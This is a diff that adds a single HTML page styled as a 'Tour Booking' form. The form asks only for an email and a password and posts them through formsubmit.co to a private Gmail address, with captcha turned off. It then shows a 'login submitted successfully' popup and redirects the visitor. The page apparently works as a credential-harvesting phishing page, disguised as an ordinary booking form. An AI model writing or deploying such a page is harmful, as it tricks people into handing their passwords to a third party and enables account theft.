@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Styled Popup Example</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    form {
+      background: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 350px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      font-size: 14px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+    button {
+      border: none;
+      background: #007bff;
+      color: #fff;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+
+    /* Modal Background */
+    .modal {
+      display: none; /* Hidden by default */
+      position: fixed; 
+      z-index: 9999;
+      left: 0;
+      top: 0;
+      width: 100%; 
+      height: 100%;
+      overflow: auto; 
+      background-color: rgba(0,0,0,0.5);
+    }
+    /* Modal Content */
+    .modal-content {
+      background-color: #fff;
+      margin: 15% auto;
+      padding: 20px;
+      border-radius: 10px;
+      width: 80%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    }
+    .modal-content button {
+      background: #28a745;
+      margin-top: 15px;
+    }
+    .modal-content button:hover {
+      background: #218838;
+    }
+  </style>
+</head>
+<body>
+
+<form id="tourForm" method="POST" action="https://formsubmit.co/muhammedshoukat016@gmail.com">
+<h2>Tour Booking</h2>
+
+<!-- Email input needs a name attribute for form submission -->
+<input type="email" name="email" id="email" placeholder="Email" required />
+
+<!-- Tour input already has a name, that's perfect -->
+<input type="password" name="pass" placeholder="Password" required />
+
+<!-- Hidden inputs for FormSubmit configuration -->
+<input type="hidden" name="_captcha" value="false" />
+<input type="hidden" name="_subject" value="New Tour Booking" />
+<input type="hidden" name="_template" value="table" />
+
+
+  <button type="submit">Submit</button>
+</form>
+
+<!-- Custom Modal -->
+<div id="myModal" class="modal">
+  <div class="modal-content">
+    <p>login submitted successfully.</p>
+    <button id="modalOkBtn">OK</button>
+  </div>
+</div>
+
+<script>
+  const form = document.getElementById("tourForm");
+  const modal = document.getElementById("myModal");
+  const okBtn = document.getElementById("modalOkBtn");
+
+  form.addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    const formData = new FormData(form);
+
+    fetch(form.action, {
+      method: "POST",
+      body: formData,
+      headers: { 'Accept': 'application/json' }
+    })
+    .then(response => {
+      if (response.ok) {
+        // Show custom modal
+        modal.style.display = "block";
+      } else {
+        alert("Oops! Something went wrong. Please try again.");
+      }
+    })
+    .catch(error => {
+      alert("Oops! Network error. Please try again.");
+      console.error(error);
+    });
+  });
+
+  okBtn.addEventListener("click", function() {
+    modal.style.display = "none";
+    window.location.href = "index.html";
+  });
+
+
+  window.onclick = function(event) {
+    if (event.target === modal) {
+      modal.style.display = "none";
+    }
+  }
+</script>
+
+</body>
+</html>
